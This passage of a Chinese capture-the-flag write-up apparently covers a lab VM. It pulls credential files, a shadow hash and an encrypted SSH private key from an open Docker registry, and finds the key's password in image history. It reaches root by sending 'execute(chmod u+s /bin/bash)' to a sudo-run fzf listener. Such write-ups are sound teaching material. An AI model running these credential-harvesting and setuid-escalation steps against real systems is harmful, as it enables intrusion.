:\"23.0.4\",\"id\":\"89cefe32583c18fc5d6e6a5ffc138147094daac30a593800fe5b6615f2d34fd6\",\"os\":\"linux\",\"parent\":\"1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\"}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\",\"parent\":\"638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\",\"comment\":\"buildkit.dockerfile.v0\",\"created\":\"2023-03-29T18:19:24.45578926Z\",\"container_config\":{\"Cmd\":[\"ARG passwd=devilcollectsit\"]},\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\",\"parent\":\"cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\",\"created\":\"2023-03-29T18:19:24.45578926Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"/bin/sh\\\"]\"]},\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\",\"created\":\"2023-03-29T18:19:24.348438709Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:9a4f77dfaba7fd2aa78186e4ef0e7486ad55101cefc1fabbc1b385601bb38920 in / \"]}}"
+      }
+   ],
+   "signatures": [
+      {
+         "header": {
+            "jwk": {
+               "crv": "P-256",
+               "kid": "X7W5:IVTA:CKTP:A6JJ:IMVJ:FOTQ:OO4M:CB4C:6JYB:PX6R:DQ6C:JPGS",
+               "kty": "EC",
+               "x": "m6jL0NHxYkVUo0-ID-HLzT0Y3OqOeOBvekpF98kC-4c",
+               "y": "WlToBayTJ8f4zcry3wiq1fMvedgRkuwE7Oycza83_YA"
+            },
+            "alg": "ES256"
+         },
+         "signature": "n75fkjkUhAvtqrT2JfMVuBUtIUgiZ0ZhgYmM4m9kqOHprKnq7YrMyNKYYTntkxDmN2uW2w_3o36LvmRW7KzyOg",
+         "protected": "eyJmb3JtYXRMZW5ndGgiOjI4MjksImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyNS0wMS0zMFQwMToyOTo0NVoifQ"
+      }
+   ]
+}                                                                                                                                     
+
+┌──(kali㉿kali)-[~/test]
+└─$ mkdir tmp     
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test]
+└─$ cd tmp 
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ curl http://192.168.72.129:1007/v2/dolly/blobs/sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017 -o blob1.tar
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  3707  100  3707    0     0   971k      0 --:--:-- --:--:-- --:--:-- 1206k
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ tar -xf blob1.tar
+                         
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ ls -la
+总计 24
+drwxrwxr-x 5 kali kali 4096  1月29日 20:32 .
+drwxrwxr-x 4 kali kali 4096  1月29日 20:32 ..
+-rw-rw-r-- 1 kali kali 3707  1月29日 20:32 blob1.tar
+drwxr-xr-x 2 kali kali 4096 2023年 4月25日 etc
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 home
+drwx------ 2 kali kali 4096 2023年 4月25日 root
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ cd etc 
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/etc]
+└─$ ls -al
+总计 32
+drwxr-xr-x 2 kali kali 4096 2023年 4月25日 .
+drwxrwxr-x 5 kali kali 4096  1月29日 20:32 ..
+-rw-r--r-- 1 kali kali  710 2023年 4月25日 group
+-rw-r--r-- 1 kali kali  697 2022年11月 4日 group-
+-rw-r--r-- 1 kali kali 1223 2023年 4月25日 passwd
+-rw-r--r-- 1 kali kali 1223 2023年 4月25日 passwd-
+-rw-r----- 1 kali kali  553 2023年 4月25日 shadow
+-rw-r----- 1 kali kali  448 2023年 4月25日 shadow-
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/etc]
+└─$ cat *   
+root:x:0:root
+bin:x:1:root,bin,daemon
+daemon:x:2:root,bin,daemon
+sys:x:3:root,bin,adm
+adm:x:4:root,adm,daemon
+tty:x:5:
+disk:x:6:root,adm
+lp:x:7:lp
+mem:x:8:
+kmem:x:9:
+wheel:x:10:root
+floppy:x:11:root
+mail:x:12:mail
+news:x:13:news
+uucp:x:14:uucp
+man:x:15:man
+cron:x:16:cron
+console:x:17:
+audio:x:18:
+cdrom:x:19:
+dialout:x:20:root
+ftp:x:21:
+sshd:x:22:
+input:x:23:
+at:x:25:at
+tape:x:26:root
+video:x:27:root
+netdev:x:28:
+readproc:x:30:
+squid:x:31:squid
+xfs:x:33:xfs
+kvm:x:34:kvm
+games:x:35:
+shadow:x:42:
+cdrw:x:80:
+www-data:x:82:
+usb:x:85:
+vpopmail:x:89:
+users:x:100:games
+ntp:x:123:
+nofiles:x:200:
+smmsp:x:209:smmsp
+locate:x:245:
+abuild:x:300:
+utmp:x:406:
+ping:x:999:
+nogroup:x:65533:
+nobody:x:65534:
+bela:x:1000:
+root:x:0:root
+bin:x:1:root,bin,daemon
+daemon:x:2:root,bin,daemon
+sys:x:3:root,bin,adm
+adm:x:4:root,adm,daemon
+tty:x:5:
+disk:x:6:root,adm
+lp:x:7:lp
+mem:x:8:
+kmem:x:9:
+wheel:x:10:root
+floppy:x:11:root
+mail:x:12:mail
+news:x:13:news
+uucp:x:14:uucp
+man:x:15:man
+cron:x:16:cron
+console:x:17:
+audio:x:18:
+cdrom:x:19:
+dialout:x:20:root
+ftp:x:21:
+sshd:x:22:
+input:x:23:
+at:x:25:at
+tape:x:26:root
+video:x:27:root
+netdev:x:28:
+readproc:x:30:
+squid:x:31:squid
+xfs:x:33:xfs
+kvm:x:34:kvm
+games:x:35:
+shadow:x:42:
+cdrw:x:80:
+www-data:x:82:
+usb:x:85:
+vpopmail:x:89:
+users:x:100:games
+ntp:x:123:
+nofiles:x:200:
+smmsp:x:209:smmsp
+locate:x:245:
+abuild:x:300:
+utmp:x:406:
+ping:x:999:
+nogroup:x:65533:
+nobody:x:65534:
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+bela:x:1000:1000:Linux User,,,:/home/bela:/bin/ash
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+bela:x:1000:1000:Linux User,,,:/home/bela:/bin/ash
+root:*::0:::::
+bin:!::0:::::
+daemon:!::0:::::
+adm:!::0:::::
+lp:!::0:::::
+sync:!::0:::::
+shutdown:!::0:::::
+halt:!::0:::::
+mail:!::0:::::
+news:!::0:::::
+uucp:!::0:::::
+operator:!::0:::::
+man:!::0:::::
+postmaster:!::0:::::
+cron:!::0:::::
+ftp:!::0:::::
+sshd:!::0:::::
+at:!::0:::::
+squid:!::0:::::
+xfs:!::0:::::
+games:!::0:::::
+cyrus:!::0:::::
+vpopmail:!::0:::::
+ntp:!::0:::::
+smmsp:!::0:::::
+guest:!::0:::::
+nobody:!::0:::::
+bela:$6$azVVFjn.mkvh.lhA$yAXPBGOZDXRdDBmn3obtzhUzxwfDD7u3YIcixohpKzTGpJS0Oeu7UVoguhmwg4DHNM8K5z7Tn93BBaDadM/A5.:19472:0:99999:7:::
+root:*::0:::::
+bin:!::0:::::
+daemon:!::0:::::
+adm:!::0:::::
+lp:!::0:::::
+sync:!::0:::::
+shutdown:!::0:::::
+halt:!::0:::::
+mail:!::0:::::
+news:!::0:::::
+uucp:!::0:::::
+operator:!::0:::::
+man:!::0:::::
+postmaster:!::0:::::
+cron:!::0:::::
+ftp:!::0:::::
+sshd:!::0:::::
+at:!::0:::::
+squid:!::0:::::
+xfs:!::0:::::
+games:!::0:::::
+cyrus:!::0:::::
+vpopmail:!::0:::::
+ntp:!::0:::::
+smmsp:!::0:::::
+guest:!::0:::::
+nobody:!::0:::::
+bela:!:19472:0:99999:7:::
+                                 
+┌──(kali㉿kali)-[~/test/tmp/etc]
+└─$ cd ..                                
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ ls la 
+ls: 无法访问 'la': 没有那个文件或目录
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ ls -la
+总计 24
+drwxrwxr-x 5 kali kali 4096  1月29日 20:32 .
+drwxrwxr-x 4 kali kali 4096  1月29日 20:32 ..
+-rw-rw-r-- 1 kali kali 3707  1月29日 20:32 blob1.tar
+drwxr-xr-x 2 kali kali 4096 2023年 4月25日 etc
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 home
+drwx------ 2 kali kali 4096 2023年 4月25日 root
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp]
+└─$ cd home 
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home]
+└─$ ls -al
+总计 12
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 .
+drwxrwxr-x 5 kali kali 4096  1月29日 20:32 ..
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 bela
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home]
+└─$ cd bela 
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home/bela]
+└─$ l -al 
+总计 16
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 ./
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 ../
+-rw------- 1 kali kali   57 2023年 4月25日 .ash_history
+drwxr-xr-x 2 kali kali 4096 2023年 4月25日 .ssh/
+-rwxr-xr-x 1 kali kali    0 1969年12月31日 .wh..wh..opq*
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home/bela]
+└─$ cat .ash_history                     
+pwd
+ls -la
+mkdir .ssh
+cd .ssh
+nano id_rsa
+vi id_rsa
+exit
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home/bela]
+└─$ cat .wh..wh..opq
+                                                                                                                                     
+┌──(kali㉿kali)-[~/test/tmp/home/bela]
+└─$ cd .ssh       
+                                                                                                                                     
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ ls -al
+总计 12
+drwxr-xr-x 2 kali kali 4096 2023年 4月25日 .
+drwxr-xr-x 3 kali kali 4096 2023年 4月25日 ..
+-rw-r--r-- 1 kali kali 2635 2023年 4月25日 id_rsa
+                                                                                                                                     
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ cat id_rsa    
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+VtVwCw==
+-----END OPENSSH PRIVATE KEY-----
+                                             
+</code></pre>
+<p>省了，都不用爆破shadow了</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ ssh2john id_rsa &gt; hash
+                                         
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
+Created directory: /home/kali/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:01:24 0.05% (ETA: 2025-01-31 17:41) 0g/s 105.4p/s 105.4c/s 105.4C/s passat..kicker
+0g 0:00:01:39 0.06% (ETA: 2025-01-31 17:26) 0g/s 105.9p/s 105.9c/s 105.9C/s strokes..jhoan
+
+</code></pre>
+<p>爆破不出来，不会是用这个吧</p>
+<p><a target="_blank" rel="noopener noreferrer" href="assets/image-20250129204242-qkg0s6r.png"><img src="assets/image-20250129204242-qkg0s6r.png" alt="image" style="max-width: 100%;"></a></p>
+<p>试试</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ chmod 600 id_rsa 
+
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ ssh bela@192.168.72.129 -i id_rsa
+ssh: connect to host 192.168.72.129 port 22: No route to host
+                                                                                                                                     
+┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ ssh bela@192.168.72.129 -i id_rsa
+Enter passphrase for key 'id_rsa': 
+Linux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Apr 25 10:35:13 2023 from 192.168.0.100
+bela@doll:~$ id
+uid=1000(bela) gid=1000(bela) grupos=1000(bela),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
+
+</code></pre>
+<h1>3.提权</h1>
+<pre class="notranslate"><code class="notranslate">bela@doll:~$ sudo -l
+Matching Defaults entries for bela on doll:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User bela may run the following commands on doll:
+    (ALL) NOPASSWD: /usr/bin/fzf --listen\=1337
+
+</code></pre>
+<p>​<code class="notranslate">fzf</code>​ 是一个交互式命令行模糊查找工具，并且其 <code class="notranslate">--listen</code>​ 选项允许它接收来自远程连接的命令。<code class="notranslate">fzf</code>​ 支持 <code class="notranslate">execute</code>​ 绑定，我们可以通过它来执行任意命令，包括启动 <code class="notranslate">bash</code>​ 或 <code class="notranslate">sh</code>​ 以获取 root shell。</p>
+<pre class="notranslate"><code class="notranslate">bela@doll:~$ sudo /usr/bin/fzf --listen=1337
+</code></pre>
+<p>去重新登录一个窗口</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
+└─$ ssh bela@192.168.72.129 -i id_rsa   
+Enter passphrase for key 'id_rsa': 
+Linux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Jan 30 02:44:26 2025 from 192.168.72.128
+
+bela@doll:~$ curl -X POST --data '{"call":"execute","args":["chmod u+s /bin/bash"]}' http://127.0.0.1:1337
+unknown action: {"call":"execute","args":["/bin/bash"]}
+bela@doll:~$ curl -X POST --data 'execute(chmod u+s /bin/bash)' http://127.0.0.1:1337
+
+</code></pre>
+<p>成功拿到root shell</p>
+<pre class="notranslate"><code class="notranslate">bela@doll:~$ bash -p
+bash-5.1# id
+uid=1000(bela) gid=1000(bela) euid=0(root) grupos=1000(bela),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
+
+</code></pre>
+<p>‍</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPH.github.io">Blog Title</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
